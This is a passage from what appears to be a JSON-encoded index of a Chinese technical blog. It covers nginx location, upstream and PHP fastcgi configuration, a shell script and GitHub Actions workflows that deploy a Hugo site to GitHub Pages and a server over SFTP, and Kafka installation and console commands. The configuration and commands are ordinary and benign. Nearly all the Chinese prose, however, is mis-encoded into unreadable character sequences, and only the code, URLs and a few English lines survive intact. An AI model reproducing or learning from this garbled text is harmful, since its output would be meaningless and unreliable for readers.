è¿˜æœ‰ä¸€ç§æ–¹å¼å°±æ˜¯æ­£åˆ™åŒ¹é…ï¼Œå¼€å¯æ­£åˆ™åŒ¹é…è¿™æ ·ï¼š`location ~`ã€‚åé¢åŠ ä¸ª`~`ã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­æ˜¯è¿ç”¨`æ­£åˆ™åŒ¹é…`æ¥é“¾æ¥phpã€‚\n\n```nginx\nlocation ~ \\.php$ {\n            root           /home/levonfly/www;\n            fastcgi_pass   127.0.0.1:9000;\n            fastcgi_index  index.php;\n            include        fastcgi.conf;\n        }\n```\n\n`\\.php$` ç†Ÿæ‚‰æ­£åˆ™çš„æˆ‘ä»¬ç›´åˆ°ï¼Œè¿™æ˜¯åŒ¹é…`.php`ç»“å°¾çš„URLï¼Œç”¨æ¥è§£æphpæ–‡ä»¶ã€‚é‡Œé¢çš„`root`ä¹Ÿæ˜¯ä¸€æ ·ï¼Œç”¨æ¥è¡¨ç¤ºè™šæ‹Ÿä¸»æœºçš„æ ¹ç›®å½•ã€‚ \n`fast_pass`é“¾æ¥çš„æ˜¯`php-fpm` çš„åœ°å€ï¼Œä¹‹å‰æˆ‘ä»¬ä¹Ÿæ­å»ºè¿‡ã€‚å…¶ä»–å‡ ä¸ªå‚æ•°æˆ‘ä»¬ä»¥åå†è¯´ã€‚\n\n\n\n### 3.6 upstream æ¨¡å—(httpå­æ¨¡å—)\n\nupstream æ¨¡å—è´Ÿå€ºè´Ÿè½½å‡è¡¡æ¨¡å—ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„è°ƒåº¦ç®—æ³•æ¥å®ç°å®¢æˆ·ç«¯IPåˆ°åç«¯æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ã€‚æˆ‘å…ˆå­¦ä¹ æ€ä¹ˆç”¨ï¼Œå…·ä½“çš„ä½¿ç”¨å®ä¾‹ä»¥åå†è¯´ã€‚\n\n```nginx\nupstream liuvv.com{\n     ip_hash;\n     server 192.168.12.1:80;\n     server 192.168.12.2:80 down;\n     server 192.168.12.3:8080  max_fails=3  fail_timeout=20s;\n     server 192.168.12.4:8080;\n}\n```\n\nåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œé€šè¿‡upstreamæŒ‡ä»¤æŒ‡å®šäº†ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨çš„åç§°liuvv.comã€‚è¿™ä¸ªåç§°å¯ä»¥ä»»æ„æŒ‡å®šï¼Œåœ¨åé¢éœ€è¦çš„åœ°æ–¹ç›´æ¥è°ƒç”¨å³å¯ã€‚\n\n\n\né‡Œé¢æ˜¯ip_hashè¿™æ˜¯å…¶ä¸­çš„ä¸€ç§è´Ÿè½½å‡è¡¡è°ƒåº¦ç®—æ³•ï¼Œä¸‹é¢ä¼šç€é‡ä»‹ç»ã€‚ç´§æ¥ç€å°±æ˜¯å„ç§æœåŠ¡å™¨äº†ã€‚ç”¨serverå…³é”®å­—è¡¨è¯†ï¼Œåé¢æ¥ipã€‚\n\nNginxçš„è´Ÿè½½å‡è¡¡æ¨¡å—ç›®å‰æ”¯æŒ4ç§è°ƒåº¦ç®—æ³•:\n\n1. weight è½®è¯¢ï¼ˆé»˜è®¤ï¼‰ã€‚æ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æŸå°æœåŠ¡å™¨å®•æœºï¼Œæ•…éšœç³»ç»Ÿè¢«è‡ªåŠ¨å‰”é™¤ï¼Œä½¿ç”¨æˆ·è®¿é—®ä¸å—å½±å“ã€‚weightã€‚æŒ‡å®šè½®è¯¢æƒå€¼ï¼Œweightå€¼è¶Šå¤§ï¼Œåˆ†é…åˆ°çš„è®¿é—®æœºç‡è¶Šé«˜ï¼Œä¸»è¦ç”¨äºåç«¯æ¯ä¸ªæœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µä¸‹ã€‚\n2. ip_hashã€‚æ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®IPçš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¥è‡ªåŒä¸€ä¸ªIPçš„è®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œæœ‰æ•ˆè§£å†³äº†åŠ¨æ€ç½‘é¡µå­˜åœ¨çš„sessionå…±äº«é—®é¢˜ã€‚\n3. fairã€‚æ¯”ä¸Šé¢ä¸¤ä¸ªæ›´åŠ æ™ºèƒ½çš„è´Ÿè½½å‡è¡¡ç®—æ³•ã€‚æ­¤ç§ç®—æ³•å¯ä»¥ä¾æ®é¡µé¢å¤§å°å’ŒåŠ è½½æ—¶é—´é•¿çŸ­æ™ºèƒ½åœ°è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼Œä¹Ÿå°±æ˜¯æ ¹æ®åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ã€‚Nginxæœ¬èº«æ˜¯ä¸æ”¯æŒfairçš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œå¿…é¡»ä¸‹è½½Nginxçš„upstream_fairæ¨¡å—ã€‚\n4. url_hashã€‚æŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥æé«˜åç«¯ç¼“å­˜æœåŠ¡å™¨çš„æ•ˆç‡ã€‚Nginxæœ¬èº«æ˜¯ä¸æ”¯æŒurl_hashçš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œå¿…é¡»å®‰è£…Nginx çš„hashè½¯ä»¶åŒ…ã€‚\n\n\n\nåœ¨HTTP Upstreamæ¨¡å—ä¸­ï¼Œå¯ä»¥é€šè¿‡serveræŒ‡ä»¤æŒ‡å®šåç«¯æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£ï¼ŒåŒæ—¶è¿˜å¯ä»¥è®¾å®šæ¯ä¸ªåç«¯æœåŠ¡å™¨åœ¨è´Ÿè½½å‡è¡¡è°ƒåº¦ä¸­çš„çŠ¶æ€ã€‚å¸¸ç”¨çš„çŠ¶æ€æœ‰ï¼š\n\n- downï¼Œè¡¨ç¤ºå½“å‰çš„serveræš‚æ—¶ä¸å‚ä¸è´Ÿè½½å‡è¡¡ã€‚\n- backupï¼Œé¢„ç•™çš„å¤‡ä»½æœºå™¨ã€‚å½“å…¶ä»–æ‰€æœ‰çš„ébackupæœºå™¨å‡ºç°æ•…éšœæˆ–è€…å¿™çš„æ—¶å€™ï¼Œæ‰ä¼šè¯·æ±‚backupæœºå™¨ï¼Œå› æ­¤è¿™å°æœºå™¨çš„å‹åŠ›æœ€è½»ã€‚\n- max_failsï¼Œå…è®¸è¯·æ±‚å¤±è´¥çš„æ¬¡æ•°ï¼Œé»˜è®¤ä¸º1ã€‚å½“è¶…è¿‡æœ€å¤§æ¬¡æ•°æ—¶ï¼Œè¿”å›proxy_next_upstream æ¨¡å—å®šä¹‰çš„é”™è¯¯ã€‚\n- fail_timeoutï¼Œåœ¨ç»å†äº†max_failsæ¬¡å¤±è´¥åï¼Œæš‚åœæœåŠ¡çš„æ—¶é—´ã€‚max_failså¯ä»¥å’Œfail_timeoutä¸€èµ·ä½¿ç”¨ã€‚\n\n**æ³¨æ„** å½“è´Ÿè½½è°ƒåº¦ç®—æ³•ä¸ºip_hashæ—¶ï¼Œåç«¯æœåŠ¡å™¨åœ¨è´Ÿè½½å‡è¡¡è°ƒåº¦ä¸­çš„çŠ¶æ€ä¸èƒ½æ˜¯weightå’Œbackupã€‚\n\n\n\n# å››. nginx é…ç½®å®æˆ˜\n\n### 4.1 nginxæŒ‡ä»¤\n\n```\nnginx -s signal\n```\n\nWhere *signal* may be one of the following:\n\n- stop â€” fast shutdown\n- quit â€” graceful shutdown\n- reload â€” reloading the configuration file\n- reopen â€” reopening the log files\n\n\n\n### 4.2 nginx å¿«é€Ÿé…ç½®æ•™ç¨‹\n\nhttps://nginx.org/en/docs/beginners_guide.html\n\n##### 4.2.1 å¦‚æœæœ‰å¤šä¸ªlocationæ¨¡å—, åŒ¹é…æœ€é•¿çš„\n\n```nginx\n    location / {\n            root /home/levonfly/www;\t#http://test.liuvv.com/\n    }\n\n    location /images/ { # è·¯å¾„æ˜¯ä¸¤è€…ç›¸åŠ /home/levonfly/images/\n            root /home/levonfly;\t#http://test.liuvv.com/images/1.png\n    }\n```\n\n##### 4.2.2 ä¸€ä¸ªnginxå®ä¾‹å¯ä»¥é€šè¿‡listenç›‘å¬ä¸åŒç«¯å£\n\n```nginx\nserver {\n    listen 8080;\n    root /home/levonfly/8080;  # locationæ²¡æœ‰root, å°±ç”¨è¿™é‡Œçš„root, ç»§æ‰¿å…³ç³»\n\n    location / {\n    }\n}\n\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        location / {\n                proxy_pass http://localhost:8080;\n        }\n        location /images/ {   \n                root /home/levonfly/; # http://test.liuvv.com/images/1.png\n        }\n  \n  \t    #location ~ \\.(gif|jpg|png)$ {  # 1.åˆ¤æ–­åç¼€ 2. æ³¢æµªçº¿æ˜¯æ­£åˆ™\n        #        root /home/levonfly/images; # http://test.liuvv.com/1.png\n        #}\n}\n```\n\n##### 4.2.3 fastcgiæ–¹å¼\n\nnginxæœ¬èº«ä¸èƒ½å¤„ç†phpï¼Œå®ƒåªæ˜¯ä¸ªwebæœåŠ¡å™¨ï¼Œå½“æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¦‚æœæ˜¯phpè¯·æ±‚ï¼Œåˆ™å‘ç»™phpè§£é‡Šå™¨å¤„ç†ï¼Œå¹¶æŠŠç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚nginxä¸€èˆ¬æ˜¯æŠŠè¯·æ±‚å‘fastcgiç®¡ç†è¿›ç¨‹å¤„ç†ï¼Œfascgiç®¡ç†è¿›ç¨‹é€‰æ‹©cgiå­è¿›ç¨‹å¤„ç†ç»“æœå¹¶è¿”å›ç»™nginx. php-fpmæ˜¯ä¸€ä¸ªphp fastcgiç®¡ç†å™¨, ç›®å‰ç›´æ¥é›†æˆåœ¨phpä¸­.\n\n\n\nå®‰è£…php:\n\n```bash\nsudo apt install php\nsudo systemctl restart php7.0-fpm.service\n```\n\nnginxé…ç½®:\n\n```nginx\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        root /home/levonfly/www;\n        index index.php index.html index.htm;\n  \n        location ~* \\.php$ {\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n                include         fastcgi_params;\n                fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n                fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n        }\n}\n```\n\n### 4.3 è™šæ‹Ÿä¸»æœºé…ç½®\n\nnginx ä½¿ç”¨åŸŸåï¼Œä¸»è¦æ˜¯ä½¿ç”¨`server`æ¨¡å—ä¸‹çš„` server_name`é€‰é¡¹ã€‚\n\nå‚è€ƒ: http://www.liuvv.com/p/d039.html\n\n### 4.4 URLè·¯ç”±é‡å†™\n\nnginx ä½¿ç”¨url é‡å†™ï¼Œä¸»è¦æ˜¯ä½¿ç”¨`server`æ¨¡å—ä¸‹çš„` location`æ¨¡å—ã€‚\n\nå‚è€ƒ: http://www.liuvv.com/p/51e59d76.html\n\n### 4.5 åå‘ä»£ç†é…ç½®\n\nnginx ä½¿ç”¨åå‘ä»£ç†ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ `server`æ¨¡å—ä¸‹ `location`æ¨¡å—ä¸‹çš„`proxy_pass`é€‰é¡¹ã€‚\n\nå‚è€ƒ: http://www.liuvv.com/p/51e59d76.html\n\n### 4.6 è´Ÿè½½å‡è¡¡é…ç½®\n\nnginx ä½¿ç”¨åå‘ä»£ç†ï¼Œä¸»è¦æ˜¯ä½¿ç”¨`upstream`æ¨¡å—(å’Œserver å¹³çº§)ã€‚\n\nå‚è€ƒ: https://www.liuvv.com/p/4c38afcc.html\n\n\n\n# äº”. å‚è€ƒèµ„æ–™\n\n+ nginxçš„é…ç½®ã€è™šæ‹Ÿä¸»æœºã€è´Ÿè½½å‡è¡¡å’Œåå‘ä»£ç†\n\n  https://www.zybuluo.com/phper/note/89391  \n\n  https://www.zybuluo.com/phper/note/90310  \n\n  https://www.zybuluo.com/phper/note/133244  \n\n+ nginx é…ç½®è¯¦è§£\n\n  https://my.oschina.net/duxuefeng/blog/34880\n\n  http://www.nginx.cn/591.html \n\n  https://jkzhao.github.io/2018/01/23/Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E5%8F%8A%E4%BC%98%E5%8C%96 \n\n  https://www.kancloud.cn/curder/nginx/96672 \n\n+ åœ¨çº¿ç”Ÿæˆnginx é…ç½®\n\n   https://nginxconfig.io\n   \n+ nginx ä¼˜ç§€æ•™ç¨‹\n\n   https://xuexb.github.io/learn-nginx/example/  \n\n   https://www.kancloud.cn/hfpp2012/nginx-tutorial/467009\n","tags":["nginx"],"categories":["nginx"]},{"title":"hugoåšå®¢è‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°githubå’Œäº‘æœåŠ¡å™¨ä¸Š","url":"%2Fp%2F35554ffc.html","content":"\næ–°çš„åšå®¢ç³»ç»Ÿå‡†å¤‡ä½¿ç”¨hugo,  æ›´æƒ³ä¸“æ³¨äºå†™, è€Œä¸æ˜¯å†™å®Œæ¯æ¬¡éƒ½æ•²å‘½ä»¤éƒ¨ç½², æ¥ä¸‹æ¥æä¸‹è‡ªåŠ¨åŒ–éƒ¨ç½².\n\nå¦å¤–blogè¦å®ç°å›½å†…å¤–åˆ†æµè¿›è¡ŒåŠ é€Ÿ,  å›½å¤–å»è®¿é—®github page, å›½å†…è®¿é—®cdn, æˆ–è€…è‡ªå·±çš„äº‘æœåŠ¡å™¨ä¸Š(åŒåä¸€æ’¸çš„ä¸€ç›´åœ¨åƒç°)\n\n<!-- more -->\n\n# 1. github page è‡ªåŠ¨éƒ¨ç½²\n\n### 1.1 gh-pages åˆ†æ”¯\n\ngithub é¡¹ç›®æ–°å»º gh-pages åˆ†æ”¯å, ä¼šè‡ªåŠ¨éƒ¨ç½²github pageä¸Š, æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§, æŠŠç”Ÿæˆçš„é™æ€æ–‡ä»¶æäº¤åˆ° ` gh-pages` åˆ†æ”¯ä¸Š.\n\n+ åˆ›å»º`gh-pages`åˆ†æ”¯\n\n```bash\n# åˆå§‹åŒ–gh-pages branch\ngit checkout --orphan gh-pages\ngit reset --hard\ngit commit --allow-empty -m \"Initializing gh-pages branch\"\ngit push origin gh-pages\ngit checkout master\n```\n\n\n+ deploy.sh\n\n```shell\n#!/bin/sh\n\n# åˆ é™¤publicæ–‡ä»¶å¤¹\nrm -rf public\nmkdir public\nrm -rf .git/worktrees/public/\ngit worktree add -B gh-pages public origin/gh-pages\nrm -rf public/*\necho \"Generating site\"\nhugo -D\n\n\n# æ”¾å…¥CNAME\necho \"www.realhttp.com\" > public/CNAME\n\n\n# æäº¤ä¿¡æ¯\necho \"Updating gh-pages branch\"\nmsg=\"rebuilding site `date`\"\nif [ $# -eq 1 ]\n          then msg=\"$1\"\nfi\ncd public && git add --all && git commit -m \"$msg\"\n\n\n# æ¨é€åˆ° gh-pages åˆ†æ”¯\necho \"Push to origin gh-pages\"\ngit pull origin gh-pages\ngit push origin gh-pages\ncd .. && rm -rf public\n```\n\næ¯æ¬¡å†™å®Œblog, è¿è¡Œä¸€ä¸‹è„šæœ¬å³å¯\n\n\n\n### 1.2 github action é…ç½®\n\nç¬¬ä¸€ç§æ–¹æ¡ˆ, æäº¤æ–‡ç« åè¿˜è¦æ‰§è¡Œä¸€æ¬¡è„šæœ¬, é€šè¿‡github action, å¯ä»¥åšåˆ°æäº¤æ–‡ç« è‡ªåŠ¨éƒ¨ç½², å³CI/CD\n\n+ hugoä¸»é¢˜\n\n  hugoçš„ä¸»é¢˜, å°½é‡ä¿è¯æ˜¯git submoduleç»´æŠ¤çš„\n\n  ```bash\n  git submodule add https://github.com/g1eny0ung/hugo-theme-dream.git themes/dream\n  ```\n\n  lookä¸€ä¸‹\n\n  ```ini\n  cat .gitmodules\n  \n  [submodule \"themes\"]\n          path = themes/dream\n          url = https://github.com/g1eny0ung/hugo-theme-dream.git\n  ```\n\n  \n\n+ ç¼–å†™github action\n\n  å»é¡¹ç›®çš„`Actions`å¢åŠ è‡ªå·±çš„workflow\n  \n  ![1](hugoåšå®¢è‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°githubå’Œäº‘æœåŠ¡å™¨ä¸Š/1.png)\n\n  å†…å®¹å¦‚ä¸‹:\n\n    ```yml\n    name: github pages\n  \n    on:\n      push:\n        branches:\n          - master  # è¿™é‡Œæ˜¯æäº¤åˆ°masteråˆ†æ”¯å°±ç«‹å³è§¦å‘job\n      pull_request:\n  \n    jobs:\n      deploy:\n        runs-on: ubuntu-18.04\n        steps:\n          - uses: actions/checkout@v2\n            with:\n              submodules: true  # Fetch Hugo themes (true OR recursive)\n              fetch-depth: 0    # Fetch all history for .GitInfo and .Lastmod\n  \n          - name: Setup Hugo\n            uses: peaceiris/actions-hugo@v2\n            with:\n              hugo-version: '0.83.1'\n  \n          - name: Build\n            run: hugo --minify\n  \n          - name: Deploy\n            uses: peaceiris/actions-gh-pages@v3\n            with:\n              github_token: ${{ secrets.GITHUB_TOKEN }}  # è¿™é‡Œä¸ç”¨åŠ¨, é»˜è®¤å°±å¥½\n              publish_dir: ./public  # æ³¨æ„æ˜¯hugoçš„publicæ–‡ä»¶å¤¹\n              cname: www.realhttp.com # cname\n    ```\n\n\n\n# 2. äº‘æœåŠ¡å™¨è‡ªåŠ¨éƒ¨ç½²\n\n### 2.1 å›½å†…å¤–åˆ†æµ\n\né¦–å…ˆå…ˆè®¾ç½®å›½å†…å¤–åˆ†æµ, å°±è¦æ±‚åŒä¸€ä¸ªåŸŸå, ä¸åŒçš„çº¿è·¯æŒ‡å‘ä¸åŒçš„åœ°å€: å¦‚ä¸‹å›¾\n\n![1](hugoåšå®¢è‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°githubå’Œäº‘æœåŠ¡å™¨ä¸Š/2.png)\n![1](hugoåšå®¢è‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°githubå’Œäº‘æœåŠ¡å™¨ä¸Š/3.png)\n\nå¢ƒå†…æˆ‘æŒ‡å‘äº†æˆ‘çš„äº‘æœåŠ¡å™¨, å¢ƒå¤–æˆ‘æŒ‡å‘äº†`github page`, å›½å¤–githubå·²ç»å¸®æˆ‘ä»¬å¤„ç†å¥½äº†, æ¥ä¸‹æ¥éœ€è¦å¤„ç†ä¸€ä¸‹å›½å†…çš„è®¿é—®.\n\n\n\n### 2.2 å›½å†…nginxé…ç½®\n\nå›½å†…è®¿é—®åŸŸåå·²ç»å®ç°äº†è®¿é—®äº‘æœåŠ¡å™¨, è¿™æ—¶å€™éœ€è¦é…ç½®nginxè®¿é—®åˆ°ç›¸åº”çš„é™æ€èµ„æº.\n\n```nginx\nserver {\n    listen 80;\n    listen [::]:80;\n    server_name realhttp.com www.realhttp.com;\n    return 301 https://www.realhttp.com$request_uri;\n}\n\nserver {\n  listen 443 ssl;\n  listen [::]:443 ssl;\n  server_name realhttp.com www.realhttp.com;\n\n  ssl_certificate /etc/nginx/ssl/realhttp/1_www.realhttp.com_bundle.crt;\n  ssl_certificate_key /etc/nginx/ssl/realhttp/2_www.realhttp.com.key;\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  root   /var/www/hugo/;\n  location / {\n          index  index.html index.htm;\n  }\n}\n```\n\né™æ€èµ„æºæ”¾åœ¨äº†`/var/www/hugo/` ä¸‹, æ¥ä¸‹æ¥éœ€è¦é€šè¿‡`github action` è‡ªåŠ¨æŠŠç”Ÿæˆçš„é™æ€èµ„æºéƒ¨ç½²åˆ°äº‘æœåŠ¡å™¨è¯¥æ–‡ä»¶å¤¹å†….\n\n\n\n### 2.3 github actioné…ç½®\n\nå› ä¸ºéœ€è¦éƒ¨ç½²åˆ°äº‘æœåŠ¡, æ‰€ä»¥éœ€è¦githubé€šè¿‡ç§é’¥æœ‰è®¿é—®æœåŠ¡å™¨çš„æƒé™, éœ€è¦åœ¨é¡¹ç›®é‡ŒåŠ ä¸Šç§é’¥å’ŒæœåŠ¡å™¨ip. \n\nåœ¨é¡¹ç›®->Settings->Secrets, æ·»åŠ ç›¸åº”çš„å˜é‡\n\n![1](hugoåšå®¢è‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°githubå’Œäº‘æœåŠ¡å™¨ä¸Š/4.png)\n\n+ github action é…ç½®å¦‚ä¸‹\n\n```yml\n name: github pages\n\n  on:\n    push:\n      branches:\n        - master  # è¿™é‡Œæ˜¯æäº¤åˆ°masteråˆ†æ”¯å°±ç«‹å³è§¦å‘job\n    pull_request:\n\n  jobs:\n    deploy:\n      runs-on: ubuntu-18.04\n      steps:\n        - uses: actions/checkout@v2\n          with:\n            submodules: true  # Fetch Hugo themes (true OR recursive)\n            fetch-depth: 0    # Fetch all history for .GitInfo and .Lastmod\n\n        - name: Setup Hugo\n          uses: peaceiris/actions-hugo@v2\n          with:\n            hugo-version: '0.83.1'\n\n        - name: Build\n          run: hugo --minify\n\n        - name: Deploy Github\n          uses: peaceiris/actions-gh-pages@v3\n          with:\n            github_token: ${{ secrets.GITHUB_TOKEN }}  # è¿™é‡Œä¸ç”¨åŠ¨, é»˜è®¤å°±å¥½\n            publish_dir: ./public  # æ³¨æ„æ˜¯hugoçš„publicæ–‡ä»¶å¤¹\n            cname: www.realhttp.com # cname\n   \n        - name: Deploy Tencent Cloud\n          uses: wlixcc/SFTP-Deploy-Action@v1.2.1 \n          with:  \n            username: 'root'   #ssh user name\n            server: '${{ secrets.SERVER_IP }}' #å¼•ç”¨ä¹‹å‰åˆ›å»ºå¥½çš„secret\n            ssh_private_key: ${{ secrets.SSH_PRIVATE_KEY }} #å¼•ç”¨ä¹‹å‰åˆ›å»ºå¥½çš„secret\n            local_path: './public/*'  # å¯¹åº”æˆ‘ä»¬é¡¹ç›®publicçš„æ–‡ä»¶å¤¹è·¯å¾„\n            remote_path: '/var/www/hugo' # å¯¹åº”äº‘ä¸Šçš„ç›®å½•\n```\n\nåœ¨é¡¹ç›®çš„`Actions`ä¸‹å¯ä»¥çœ‹åˆ°ç›¸åº”çš„æ‰§è¡ŒçŠ¶æ€:\n\n![1](hugoåšå®¢è‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°githubå’Œäº‘æœåŠ¡å™¨ä¸Š/5.png)\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://github.com/peaceiris/actions-hugo\n+ https://zhuanlan.zhihu.com/p/37752930\n+ https://zhuanlan.zhihu.com/p/107545396","tags":["åšå®¢"],"categories":["åšå®¢"]},{"title":"filebeatè¾“å‡ºåˆ°kafka","url":"%2Fp%2F944e7ab5.html","content":"\n# 1. kafka\n\n### 1.1 å®‰è£…\n\n+ kafka_2.13-2.8.0.tgz ,   å‰é¢çš„ç‰ˆæœ¬å·æ˜¯ç¼–è¯‘ Kafka æºä»£ç çš„ Scala ç¼–è¯‘å™¨ç‰ˆæœ¬, çœŸæ­£çš„ç‰ˆæœ¬å·æ˜¯2.8.0\n\n```bash\nwget https://mirrors.bfsu.edu.cn/apache/kafka/2.8.0/kafka_2.13-2.8.0.tgz\ntar -xzf kafka_2.13-2.8.0.tgz \ncd kafka_2.13-2.8.0\n```\n\n<!-- more -->\n\n+ å¯åŠ¨\n\n```bash\n# ä¸€ä¸ªç»ˆç«¯\nbin/zookeeper-server-start.sh config/zookeeper.properties\n\n# å¦å¤–ä¸€ä¸ªç»ˆç«¯\nbin/kafka-server-start.sh config/server.properties\n```\n\n\n\n+ å®‰è£… java\n\n  æŠ¥é”™: /root/kafka_2.13-2.8.0/bin/kafka-run-class.sh: line 330: exec: java: not found\n  Your local environment must have Java 8+ installed.\n\n```bash\napt install openjdk-11-jre-headless\njava --version\n```\n\n\n\n### 1.2 systemctl æœåŠ¡\n\nhttps://gist.github.com/vipmax/9ceeaa02932ba276fa810c923dbcbd4f\n\n`vi /etc/systemd/system/kafka-zookeeper.service`\n\n```ini\n[Unit]\nDescription=Apache Zookeeper server (Kafka)\nDocumentation=http://zookeeper.apache.org\nRequires=network.target remote-fs.target\nAfter=network.target remote-fs.target\n[Service]\nType=simple\nExecStart=/data/tools/kafka-worth/bin/zookeeper-server-start.sh /data/tools/kafka-worth/config/zookeeper.properties\nExecStop=/data/tools/kafka-worth/bin/zookeeper-server-stop.sh\n[Install]\nWantedBy=multi-user.target\n```\n\n\n\n`vi /etc/systemd/system/kafka.service`\n\n```ini\n[Unit]\nDescription=Apache Kafka server (broker)\nDocumentation=http://kafka.apache.org/documentation.html\nRequires=network.target remote-fs.target\nAfter=network.target remote-fs.target kafka-zookeeper.service\n[Service]\nType=simple\nExecStart=/opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties\nExecStop=/opt/kafka/bin/kafka-server-stop.sh\n[Install]\nWantedBy=multi-user.target\n```\n\n+ å¯åŠ¨\n\n```bash\nsystemctl daemon-reload\nsystemctl start kafka-zookeeper.service\nsystemctl start kafka.service\n```\n\n\n\n### 1.3 kafka ä½¿ç”¨\n\n+ åˆ›å»ºä¸€ä¸ª topic.\n\n  ```bash\n  bin/kafka-topics.sh --create --topic pingback --bootstrap-server localhost:9092\n  \n  # åˆ é™¤topic\n  bin/kafka-topics.sh --delete --topic pingback --bootstrap-server localhost:9092\n  ```\n\n+ æ˜¾ç¤º\n\n  ```bash\n  # æ˜¾ç¤ºæ‰€æœ‰ topics\n  bin/kafka-topics.sh --list --bootstrap-server localhost:9092 \n  \n  \n  # æ˜¾ç¤ºç‰¹å®š topic å±æ€§\n  bin/kafka-topics.sh --describe --topic pingback --bootstrap-server localhost:9092\n  ```\n\n\n+ çœ‹ç»„\n  \n  ```bash\n  # æ˜¾ç¤ºæ‰€æœ‰ç»„\n  bin/kafka-consumer-groups.sh  --list --bootstrap-server localhost:9092\n  \n  \n  # çœ‹ç‰¹å®šç»„çš„æ¶ˆè´¹æƒ…å†µ\n  bin/kafka-consumer-groups.sh --describe --group test-consumer-group --bootstrap-server localhost:9092\n  ```\n  \n+ ç”Ÿäº§\n  \n  ```bash\n  bin/kafka-console-producer.sh --topic pingback --bootstrap-server localhost:9092\n  #>This is my first event\n  #>This is my second event\n  #You can stop the producer client with Ctrl-C at any time.\n  ```\n\n\n+ æ¶ˆè´¹\n\n  ```bash\n  bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic pingback\n  bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic pingback --from-beginning --group test-consumer-group\n  \n  #This is my first event\n  #This is my second event\n  #You can stop the consumer client with Ctrl-C at any time.\n  ```\n  \n  \n  \n+ é‡ç½®offset\n\n  ```bash\n  # å›åˆ°æœ€æ—©è¯¥æ¶ˆè´¹çš„ç‚¹\n  bin/kafka-consumer-groups.sh --group test-consumer-group --bootstrap-server localhost:9092 --reset-offsets --to-earliest --all-topics --execute\n  \n  # é‡ç½®åˆ°ç‰¹å®šçš„ offset\n  bin/kafka-consumer-groups.sh --group test-consumer-group --bootstrap-server localhost:9092 --reset-offsets --topic pingback:0 --to-offset 123 --execute\n  ```\n\n  æäº¤è¿‡offsetï¼Œlatestå’Œearliestæ²¡æœ‰åŒºåˆ«ï¼Œä½†æ˜¯åœ¨æ²¡æœ‰æäº¤offsetæƒ…å†µä¸‹ï¼Œç”¨latestç›´æ¥ä¼šå¯¼è‡´æ— æ³•è¯»å–æ—§æ•°æ®ã€‚\n\n\n+ åˆ é™¤æ•°æ®\n\n  ```bash\n  # æ¸…ç†æ•°æ®\n  1. bin/kafka-configs.sh --bootstrap-server localhost:9092 --entity-type topics --entity-name pingback --alter --add-config retention.ms=1000\n  2. bin/kafka-configs.sh --bootstrap-server localhost:9092 --entity-type topics --entity-name pingback --alter --delete-config retention.ms\n  \n  # é‡ç½®æœ€åˆ\n  ```\n\n\n\n\n### 1.4 é…ç½®\n\n##### 1.4.1 kafkaæ”¯æŒè¿œç¨‹è®¿é—®\n\næ‰“å¼€config/server.propertiesé…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹å¦‚ä¸‹\n\næŠŠ31è¡Œçš„æ³¨é‡Šå»æ‰ï¼Œlisteners=PLAINTEXT://:9092\næŠŠ36è¡Œçš„æ³¨é‡Šå»æ‰ï¼ŒæŠŠadvertised.listenerså€¼æ”¹ä¸ºPLAINTEXT://host_ip:9092\n\n\n\n##### 1.4.2 ä¿®æ”¹ log 